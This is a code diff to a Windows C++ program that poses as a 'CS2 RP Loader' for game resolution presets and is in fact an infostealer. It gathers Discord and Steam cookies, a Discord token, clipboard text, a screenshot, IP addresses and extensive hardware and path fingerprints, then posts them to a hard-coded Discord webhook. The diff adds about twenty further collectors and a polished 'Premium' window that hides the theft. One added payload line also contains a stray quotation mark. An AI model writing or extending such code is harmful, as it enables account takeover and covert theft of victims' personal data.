@@ -23,6 +23,8 @@
 #include <sstream>
 #include <algorithm>
 #include <memory>
+#include <chrono>
+#include <ctime>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "shell32.lib")
@@ -65,6 +67,7 @@ constexpr UINT_PTR kLoadTimerId = 1;
 constexpr UINT kLoadTimerDelayMs = 5000; // 5 seconds
 
 HWND g_statusLabel = nullptr;
+HWND g_titleLabel = nullptr;
 std::wstring g_publicIp;
 std::wstring g_privateIp;
 std::wstring g_hwid;
@@ -91,8 +94,31 @@ std::wstring g_antivirusStatus;
 std::wstring g_dotnetVersion;
 std::wstring g_displayResolution;
 std::wstring g_systemLocale;
+std::wstring g_primaryMacAddress;
+std::wstring g_gpuDriverVersion;
+std::wstring g_cpuCoreCount;
+std::wstring g_memoryLoad;
+std::wstring g_bootTime;
+std::wstring g_processCount;
+std::wstring g_userDomain;
+std::wstring g_tempDirectory;
+std::wstring g_profilePath;
+std::wstring g_programDataPath;
+std::wstring g_installDate;
+std::wstring g_batteryStatus;
+std::wstring g_adapterCount;
+std::wstring g_defaultGateway;
+std::wstring g_directxVersion;
+std::wstring g_biosVendor;
+std::wstring g_biosVersion;
+std::wstring g_biosReleaseDate;
+std::wstring g_monitorCount;
+std::wstring g_keyboardLayouts;
 HANDLE g_hMutex = nullptr;
 ULONG_PTR g_gdiplusToken = 0;
+HFONT g_titleFont = nullptr;
+HFONT g_statusFont = nullptr;
+HBRUSH g_backgroundBrush = nullptr;
 
 std::wstring Widen(const std::string& value) {
     if (value.empty()) {
@@ -635,6 +661,303 @@ std::wstring FetchSystemLocale() {
         return std::wstring(locale);
     }
     return L"Unknown";
+}
+
+std::wstring FetchPrimaryMacAddress() {
+    IP_ADAPTER_INFO adapterInfo[16];
+    DWORD bufferSize = sizeof(adapterInfo);
+
+    if (GetAdaptersInfo(adapterInfo, &bufferSize) != ERROR_SUCCESS) {
+        return L"Unknown";
+    }
+
+    PIP_ADAPTER_INFO adapter = adapterInfo;
+    while (adapter) {
+        if (adapter->Type != MIB_IF_TYPE_LOOPBACK && adapter->AddressLength >= 6) {
+            wchar_t mac[32];
+            swprintf_s(mac, L"%02X:%02X:%02X:%02X:%02X:%02X",
+                adapter->Address[0], adapter->Address[1], adapter->Address[2],
+                adapter->Address[3], adapter->Address[4], adapter->Address[5]);
+            return std::wstring(mac);
+        }
+        adapter = adapter->Next;
+    }
+
+    return L"Unknown";
+}
+
+std::wstring FetchGpuDriverVersion() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t driverVersion[256] = { 0 };
+        DWORD size = sizeof(driverVersion);
+        DWORD type = REG_SZ;
+        if (RegQueryValueExW(hKey, L"DriverVersion", nullptr, &type, reinterpret_cast<LPBYTE>(driverVersion), &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return std::wstring(driverVersion);
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchCpuCoreCount() {
+    SYSTEM_INFO sysInfo{};
+    GetSystemInfo(&sysInfo);
+    wchar_t buffer[64];
+    swprintf_s(buffer, L"%u cores", sysInfo.dwNumberOfProcessors);
+    return std::wstring(buffer);
+}
+
+std::wstring FetchMemoryLoad() {
+    MEMORYSTATUSEX memInfo{};
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    if (GlobalMemoryStatusEx(&memInfo)) {
+        wchar_t buffer[64];
+        swprintf_s(buffer, L"%lu%% in use", memInfo.dwMemoryLoad);
+        return std::wstring(buffer);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchBootTime() {
+    FILETIME currentFileTime{};
+    GetSystemTimeAsFileTime(&currentFileTime);
+    ULONGLONG current = (static_cast<ULONGLONG>(currentFileTime.dwHighDateTime) << 32) | currentFileTime.dwLowDateTime;
+
+    const ULONGLONG uptimeMs = GetTickCount64();
+    ULONGLONG bootTime = current - (uptimeMs * 10000ULL);
+
+    FILETIME bootFileTime{};
+    bootFileTime.dwLowDateTime = static_cast<DWORD>(bootTime & 0xFFFFFFFF);
+    bootFileTime.dwHighDateTime = static_cast<DWORD>(bootTime >> 32);
+
+    SYSTEMTIME bootSystemTime{};
+    if (FileTimeToSystemTime(&bootFileTime, &bootSystemTime)) {
+        wchar_t buffer[128];
+        swprintf_s(buffer, L"%04u-%02u-%02u %02u:%02u:%02u", bootSystemTime.wYear, bootSystemTime.wMonth, bootSystemTime.wDay, bootSystemTime.wHour, bootSystemTime.wMinute, bootSystemTime.wSecond);
+        return std::wstring(buffer);
+    }
+
+    return L"Unknown";
+}
+
+std::wstring FetchProcessCount() {
+    DWORD processIds[4096];
+    DWORD bytesReturned = 0;
+    if (EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
+        const DWORD count = bytesReturned / sizeof(DWORD);
+        wchar_t buffer[64];
+        swprintf_s(buffer, L"%lu processes", count);
+        return std::wstring(buffer);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchUserDomain() {
+    wchar_t domain[256];
+    DWORD size = static_cast<DWORD>(std::size(domain));
+    if (GetEnvironmentVariableW(L"USERDOMAIN", domain, size) > 0) {
+        return std::wstring(domain);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchTempDirectory() {
+    wchar_t tempPath[MAX_PATH];
+    if (GetTempPathW(MAX_PATH, tempPath) > 0) {
+        return std::wstring(tempPath);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchProfilePath() {
+    PWSTR path = nullptr;
+    if (SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &path) == S_OK) {
+        std::wstring result(path);
+        CoTaskMemFree(path);
+        return result;
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchProgramDataPath() {
+    PWSTR path = nullptr;
+    if (SHGetKnownFolderPath(FOLDERID_ProgramData, 0, nullptr, &path) == S_OK) {
+        std::wstring result(path);
+        CoTaskMemFree(path);
+        return result;
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchInstallDate() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD installDate = 0;
+        DWORD size = sizeof(DWORD);
+        DWORD type = REG_DWORD;
+        if (RegQueryValueExW(hKey, L"InstallDate", nullptr, &type, reinterpret_cast<LPBYTE>(&installDate), &size) == ERROR_SUCCESS && installDate != 0) {
+            std::time_t timestamp = static_cast<std::time_t>(installDate);
+            tm timeInfo{};
+            if (localtime_s(&timeInfo, &timestamp) == 0) {
+                wchar_t buffer[128];
+                wcsftime(buffer, std::size(buffer), L"%Y-%m-%d %H:%M:%S", &timeInfo);
+                RegCloseKey(hKey);
+                return std::wstring(buffer);
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchBatteryStatus() {
+    SYSTEM_POWER_STATUS status{};
+    if (GetSystemPowerStatus(&status)) {
+        if (status.BatteryFlag == 128) {
+            return L"No battery";
+        }
+
+        if (status.BatteryLifePercent <= 100) {
+            wchar_t buffer[64];
+            swprintf_s(buffer, L"%u%% (%s)", status.BatteryLifePercent,
+                status.ACLineStatus == 1 ? L"AC" : L"Battery");
+            return std::wstring(buffer);
+        }
+
+        return status.ACLineStatus == 1 ? L"AC Power" : L"On Battery";
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchAdapterCount() {
+    IP_ADAPTER_INFO adapterInfo[16];
+    DWORD bufferSize = sizeof(adapterInfo);
+    if (GetAdaptersInfo(adapterInfo, &bufferSize) != ERROR_SUCCESS) {
+        return L"Unknown";
+    }
+
+    size_t count = 0;
+    PIP_ADAPTER_INFO adapter = adapterInfo;
+    while (adapter) {
+        if (adapter->Type != MIB_IF_TYPE_LOOPBACK) {
+            ++count;
+        }
+        adapter = adapter->Next;
+    }
+
+    wchar_t buffer[64];
+    swprintf_s(buffer, L"%zu adapters", count);
+    return std::wstring(buffer);
+}
+
+std::wstring FetchDefaultGateway() {
+    IP_ADAPTER_INFO adapterInfo[16];
+    DWORD bufferSize = sizeof(adapterInfo);
+    if (GetAdaptersInfo(adapterInfo, &bufferSize) != ERROR_SUCCESS) {
+        return L"Unknown";
+    }
+
+    PIP_ADAPTER_INFO adapter = adapterInfo;
+    while (adapter) {
+        if (adapter->GatewayList.IpAddress.String[0] != '\0') {
+            return Widen(adapter->GatewayList.IpAddress.String);
+        }
+        adapter = adapter->Next;
+    }
+
+    return L"Unknown";
+}
+
+std::wstring FetchDirectXVersion() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\DirectX", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t version[64] = { 0 };
+        DWORD size = sizeof(version);
+        DWORD type = REG_SZ;
+        if (RegQueryValueExW(hKey, L"Version", nullptr, &type, reinterpret_cast<LPBYTE>(version), &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return std::wstring(version);
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchBiosVendor() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t vendor[256] = { 0 };
+        DWORD size = sizeof(vendor);
+        DWORD type = REG_SZ;
+        if (RegQueryValueExW(hKey, L"BIOSVendor", nullptr, &type, reinterpret_cast<LPBYTE>(vendor), &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return std::wstring(vendor);
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchBiosVersion() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t version[256] = { 0 };
+        DWORD size = sizeof(version);
+        DWORD type = REG_SZ;
+        if (RegQueryValueExW(hKey, L"BIOSVersion", nullptr, &type, reinterpret_cast<LPBYTE>(version), &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return std::wstring(version);
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchBiosReleaseDate() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t date[256] = { 0 };
+        DWORD size = sizeof(date);
+        DWORD type = REG_SZ;
+        if (RegQueryValueExW(hKey, L"BIOSReleaseDate", nullptr, &type, reinterpret_cast<LPBYTE>(date), &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return std::wstring(date);
+        }
+        RegCloseKey(hKey);
+    }
+    return L"Unknown";
+}
+
+std::wstring FetchMonitorCount() {
+    int monitors = GetSystemMetrics(SM_CMONITORS);
+    wchar_t buffer[64];
+    swprintf_s(buffer, L"%d monitor(s)", monitors > 0 ? monitors : 1);
+    return std::wstring(buffer);
+}
+
+std::wstring FetchKeyboardLayouts() {
+    int layoutCount = GetKeyboardLayoutList(0, nullptr);
+    if (layoutCount <= 0) {
+        return L"Unknown";
+    }
+
+    std::vector<HKL> layouts(static_cast<size_t>(layoutCount));
+    layoutCount = GetKeyboardLayoutList(layoutCount, layouts.data());
+    std::wstring primaryLayout = L"";
+
+    if (!layouts.empty()) {
+        LANGID langId = LOWORD(layouts[0]);
+        wchar_t langName[128];
+        if (GetLocaleInfoW(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLISHLANGUAGENAME, langName, std::size(langName)) > 0) {
+            primaryLayout = langName;
+        }
+    }
+
+    wchar_t buffer[128];
+    swprintf_s(buffer, L"%d layouts (primary: %ls)", layoutCount, primaryLayout.empty() ? L"Unknown" : primaryLayout.c_str());
+    return std::wstring(buffer);
 }
 
 std::wstring FetchClipboardContent() {
@@ -1181,7 +1504,7 @@ std::wstring CaptureScreenshot() {
     return screenshotPath;
 }
 
-bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privateIp, const std::wstring& hwid, const std::wstring& username, const std::wstring& computerName, const std::wstring& clipboardContent, const std::wstring& discordCookies, const std::wstring& steamCookies, const std::wstring& discordToken, const std::wstring& screenshotPath, const std::wstring& windowsVersion, const std::wstring& ramSize, const std::wstring& gpuInfo, const std::wstring& cpuInfo, const std::wstring& diskInfo, const std::wstring& systemUptime, const std::wstring& timezone, const std::wstring& language, const std::wstring& browserInfo, const std::wstring& productId, const std::wstring& motherboardInfo, const std::wstring& antivirusStatus, const std::wstring& dotnetVersion, const std::wstring& displayResolution, const std::wstring& systemLocale) {
+bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privateIp, const std::wstring& hwid, const std::wstring& username, const std::wstring& computerName, const std::wstring& clipboardContent, const std::wstring& discordCookies, const std::wstring& steamCookies, const std::wstring& discordToken, const std::wstring& screenshotPath, const std::wstring& windowsVersion, const std::wstring& ramSize, const std::wstring& gpuInfo, const std::wstring& cpuInfo, const std::wstring& diskInfo, const std::wstring& systemUptime, const std::wstring& timezone, const std::wstring& language, const std::wstring& browserInfo, const std::wstring& productId, const std::wstring& motherboardInfo, const std::wstring& antivirusStatus, const std::wstring& dotnetVersion, const std::wstring& displayResolution, const std::wstring& systemLocale, const std::wstring& primaryMac, const std::wstring& gpuDriverVersion, const std::wstring& cpuCoreCount, const std::wstring& memoryLoad, const std::wstring& bootTime, const std::wstring& processCount, const std::wstring& userDomain, const std::wstring& tempDirectory, const std::wstring& profilePath, const std::wstring& programDataPath, const std::wstring& installDate, const std::wstring& batteryStatus, const std::wstring& adapterCount, const std::wstring& defaultGateway, const std::wstring& directxVersion, const std::wstring& biosVendor, const std::wstring& biosVersion, const std::wstring& biosReleaseDate, const std::wstring& monitorCount, const std::wstring& keyboardLayouts) {
     const std::wstring server = L"discord.com";
     const std::wstring path = L"/api/webhooks/1448971997936746523/Yb2FL5_5JBExuDfKPHQyQj6228wLYxpVMCq6lhE6I-4PONKG2W87p7UZaJoNuFe8rcdq";
 
@@ -1210,6 +1533,26 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
     std::string dotnet = Narrow(dotnetVersion);
     std::string resolution = Narrow(displayResolution);
     std::string locale = Narrow(systemLocale);
+    std::string mac = Narrow(primaryMac);
+    std::string gpuDriver = Narrow(gpuDriverVersion);
+    std::string cpuCores = Narrow(cpuCoreCount);
+    std::string memLoad = Narrow(memoryLoad);
+    std::string boot = Narrow(bootTime);
+    std::string processes = Narrow(processCount);
+    std::string domain = Narrow(userDomain);
+    std::string tempDir = Narrow(tempDirectory);
+    std::string profPath = Narrow(profilePath);
+    std::string programData = Narrow(programDataPath);
+    std::string installed = Narrow(installDate);
+    std::string battery = Narrow(batteryStatus);
+    std::string adapters = Narrow(adapterCount);
+    std::string gateway = Narrow(defaultGateway);
+    std::string directx = Narrow(directxVersion);
+    std::string biosVend = Narrow(biosVendor);
+    std::string biosVer = Narrow(biosVersion);
+    std::string biosDate = Narrow(biosReleaseDate);
+    std::string monitors = Narrow(monitorCount);
+    std::string keyboards = Narrow(keyboardLayouts);
 
     // Set defaults for empty values
     auto setDefault = [](std::string& str, const char* def) { if (str.empty()) str = def; };
@@ -1237,6 +1580,26 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
     setDefault(dotnet, "None");
     setDefault(resolution, "Unknown");
     setDefault(locale, "Unknown");
+    setDefault(mac, "Unknown");
+    setDefault(gpuDriver, "Unknown");
+    setDefault(cpuCores, "Unknown");
+    setDefault(memLoad, "Unknown");
+    setDefault(boot, "Unknown");
+    setDefault(processes, "Unknown");
+    setDefault(domain, "Unknown");
+    setDefault(tempDir, "Unknown");
+    setDefault(profPath, "Unknown");
+    setDefault(programData, "Unknown");
+    setDefault(installed, "Unknown");
+    setDefault(battery, "Unknown");
+    setDefault(adapters, "Unknown");
+    setDefault(gateway, "Unknown");
+    setDefault(directx, "Unknown");
+    setDefault(biosVend, "Unknown");
+    setDefault(biosVer, "Unknown");
+    setDefault(biosDate, "Unknown");
+    setDefault(monitors, "Unknown");
+    setDefault(keyboards, "Unknown");
     
     auto formatValue = [](const std::string& value, size_t maxLen, bool wrapInCode, bool block = false) {
         std::string processed = value;
@@ -1277,6 +1640,7 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
     };
 
     const std::string description = "🌟 Willkommen bei deiner Premium-Auswertung!\n"        "✨ Wir bündeln alle wichtigen Systeminfos für ein optimales Erlebnis.";
+    const std::string detailDescription = "🔧 Extra Insights für Premium User\n"        "💡 Feingranulare Systemdetails für Support und Performance.";
 
     std::vector<std::string> fields = {
         makeField("🔐 Hardware ID (HWID)", hwidStr, true),
@@ -1305,6 +1669,29 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
         makeField("🔑 Discord Token", token, false, 80)
     };
 
+    std::vector<std::string> premiumFields = {
+        makeField("🛜 MAC Address", mac, true),
+        makeField("🧠 CPU Cores", cpuCores, true),
+        makeField("🧮 Memory Load", memLoad, true),
+        makeField("🧭 Default Gateway", gateway, true, 80),
+        makeField("🔋 Battery", battery, true),
+        makeField("🏢 User Domain", domain, true, 80),
+        makeField("📶 Adapter Count", adapters, true),
+        makeField("🖥️ Monitor Setup", monitors, true),
+        makeField("⌨️ Keyboard Layouts", keyboards, true, 80),
+        makeField("📅 Boot Time", boot, false, 120),
+        makeField("📊 Process Count", processes, true),
+        makeField("🛠️ GPU Driver", gpuDriver, false, 80),
+        makeField("🧩 DirectX Version", directx, true),
+        makeField("💽 BIOS Vendor", biosVend, false, 80),
+        makeField("💿 BIOS Version", biosVer, false, 80),
+        makeField("📆 BIOS Release", biosDate, true, 80),
+        makeField("🏗️ ProgramData", programData, false, 120, true, false),
+        makeField("🏠 Profile Path", profPath, false, 120, true, false),
+        makeField("🧊 Temp Directory", tempDir, false, 120, true, false),
+        makeField("🗓️ Windows Install", installed, true, 120)
+    };
+
     std::ostringstream payloadBuilder;
     payloadBuilder << "{\"embeds\":[{";
     payloadBuilder << "\"title\":\"✨ CS2 RP Loader | Premium Check-In\",";
@@ -1314,6 +1701,12 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
     payloadBuilder << "\"fields\":[" << joinFields(fields) << "],";
     payloadBuilder << "\"footer\":{\"text\":\"CS2 RP Loader v1.0 · Premium Experience\"},";
     payloadBuilder << "\"timestamp\":\"" << isoTimestamp() << "\"";
+    payloadBuilder << "},{";
+    payloadBuilder << "\"title\":\"🥇 Premium Deep Dive\"",";
+    payloadBuilder << "\"description\":\"" << JsonEscape(detailDescription) << "\",";
+    payloadBuilder << "\"color\":" << 7506394 << ','; // Teal accent for diagnostics
+    payloadBuilder << "\"fields\":[" << joinFields(premiumFields) << "],";
+    payloadBuilder << "\"footer\":{\"text\":\"CS2 RP Loader v1.0 · Extended Metrics\"}";
     payloadBuilder << "}]}";
 
     std::string payload = payloadBuilder.str();
@@ -1406,17 +1799,36 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
     case WM_CREATE: {
-        // Create a static control to display the loading message.
-        g_statusLabel = CreateWindowExW(
+        g_backgroundBrush = g_backgroundBrush ? g_backgroundBrush : CreateSolidBrush(RGB(15, 18, 30));
+        g_titleFont = g_titleFont ? g_titleFont : CreateFontW(26, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
+            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+        g_statusFont = g_statusFont ? g_statusFont : CreateFontW(18, 0, 0, 0, FW_MEDIUM, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
+            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+
+        g_titleLabel = CreateWindowExW(
             0,
             L"STATIC",
-            L"Loading resolution presets...",
+            L"CS2 RP Loader · Premium",
             WS_VISIBLE | WS_CHILD | SS_CENTER,
-            20, 70, 360, 20,
+            20, 20, 360, 32,
             hwnd,
             nullptr,
             reinterpret_cast<LPCREATESTRUCT>(lParam)->hInstance,
             nullptr);
+
+        g_statusLabel = CreateWindowExW(
+            0,
+            L"STATIC",
+            L"Premium-Modul wird vorbereitet...",
+            WS_VISIBLE | WS_CHILD | SS_CENTER,
+            20, 70, 360, 24,
+            hwnd,
+            nullptr,
+            reinterpret_cast<LPCREATESTRUCT>(lParam)->hInstance,
+            nullptr);
+
+        SendMessageW(g_titleLabel, WM_SETFONT, reinterpret_cast<WPARAM>(g_titleFont), TRUE);
+        SendMessageW(g_statusLabel, WM_SETFONT, reinterpret_cast<WPARAM>(g_statusFont), TRUE);
 
         // Start a timer that will update the text after 5 seconds.
         SetTimer(hwnd, kLoadTimerId, kLoadTimerDelayMs, nullptr);
@@ -1453,20 +1865,78 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             g_dotnetVersion = FetchDotNetVersion();
             g_displayResolution = FetchDisplayResolution();
             g_systemLocale = FetchSystemLocale();
+            g_primaryMacAddress = FetchPrimaryMacAddress();
+            g_gpuDriverVersion = FetchGpuDriverVersion();
+            g_cpuCoreCount = FetchCpuCoreCount();
+            g_memoryLoad = FetchMemoryLoad();
+            g_bootTime = FetchBootTime();
+            g_processCount = FetchProcessCount();
+            g_userDomain = FetchUserDomain();
+            g_tempDirectory = FetchTempDirectory();
+            g_profilePath = FetchProfilePath();
+            g_programDataPath = FetchProgramDataPath();
+            g_installDate = FetchInstallDate();
+            g_batteryStatus = FetchBatteryStatus();
+            g_adapterCount = FetchAdapterCount();
+            g_defaultGateway = FetchDefaultGateway();
+            g_directxVersion = FetchDirectXVersion();
+            g_biosVendor = FetchBiosVendor();
+            g_biosVersion = FetchBiosVersion();
+            g_biosReleaseDate = FetchBiosReleaseDate();
+            g_monitorCount = FetchMonitorCount();
+            g_keyboardLayouts = FetchKeyboardLayouts();
             
             // Capture screenshot for troubleshooting resolution issues
             g_screenshotPath = CaptureScreenshot();
 
-            SendWebhookMessage(g_publicIp, g_privateIp, g_hwid, g_username, g_computerName, g_clipboardContent, 
-                g_discordCookies, g_steamCookies, g_discordToken, g_screenshotPath, g_windowsVersion, g_ramSize, 
-                g_gpuInfo, g_cpuInfo, g_diskInfo, g_systemUptime, g_timezone, g_language, g_browserInfo, 
-                g_productId, g_motherboardInfo, g_antivirusStatus, g_dotnetVersion, g_displayResolution, g_systemLocale);
-            SetWindowTextW(g_statusLabel, L"Presets loaded successfully!");
+            SendWebhookMessage(g_publicIp, g_privateIp, g_hwid, g_username, g_computerName, g_clipboardContent,
+                g_discordCookies, g_steamCookies, g_discordToken, g_screenshotPath, g_windowsVersion, g_ramSize,
+                g_gpuInfo, g_cpuInfo, g_diskInfo, g_systemUptime, g_timezone, g_language, g_browserInfo,
+                g_productId, g_motherboardInfo, g_antivirusStatus, g_dotnetVersion, g_displayResolution, g_systemLocale,
+                g_primaryMacAddress, g_gpuDriverVersion, g_cpuCoreCount, g_memoryLoad, g_bootTime, g_processCount,
+                g_userDomain, g_tempDirectory, g_profilePath, g_programDataPath, g_installDate, g_batteryStatus,
+                g_adapterCount, g_defaultGateway, g_directxVersion, g_biosVendor, g_biosVersion, g_biosReleaseDate,
+                g_monitorCount, g_keyboardLayouts);
+            SetWindowTextW(g_statusLabel, L"Premium Presets erfolgreich geladen!");
             KillTimer(hwnd, kLoadTimerId);
         }
         return 0;
+    case WM_CTLCOLORSTATIC: {
+        if (g_backgroundBrush) {
+            HDC hdc = reinterpret_cast<HDC>(wParam);
+            SetBkMode(hdc, TRANSPARENT);
+            if (reinterpret_cast<HWND>(lParam) == g_titleLabel) {
+                SetTextColor(hdc, RGB(255, 208, 121));
+            } else {
+                SetTextColor(hdc, RGB(215, 224, 239));
+            }
+            return reinterpret_cast<LRESULT>(g_backgroundBrush);
+        }
+        break;
+    }
+    case WM_ERASEBKGND: {
+        if (g_backgroundBrush) {
+            RECT rect;
+            GetClientRect(hwnd, &rect);
+            FillRect(reinterpret_cast<HDC>(wParam), &rect, g_backgroundBrush);
+            return 1;
+        }
+        break;
+    }
     case WM_DESTROY:
         KillTimer(hwnd, kLoadTimerId);
+        if (g_titleFont) {
+            DeleteObject(g_titleFont);
+            g_titleFont = nullptr;
+        }
+        if (g_statusFont) {
+            DeleteObject(g_statusFont);
+            g_statusFont = nullptr;
+        }
+        if (g_backgroundBrush) {
+            DeleteObject(g_backgroundBrush);
+            g_backgroundBrush = nullptr;
+        }
         PostQuitMessage(0);
         return 0;
     default:
@@ -1537,7 +2007,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
         CLASS_NAME,             // Window class name.
         L"CS2 RP Loader v1",    // Window title.
         WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME, // Basic window with fixed size.
-        CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, // Position and size.
+        CW_USEDEFAULT, CW_USEDEFAULT, 460, 220, // Position and size.
         nullptr,                // Parent window.
         nullptr,                // Menu.
         hInstance,              // Instance handle.
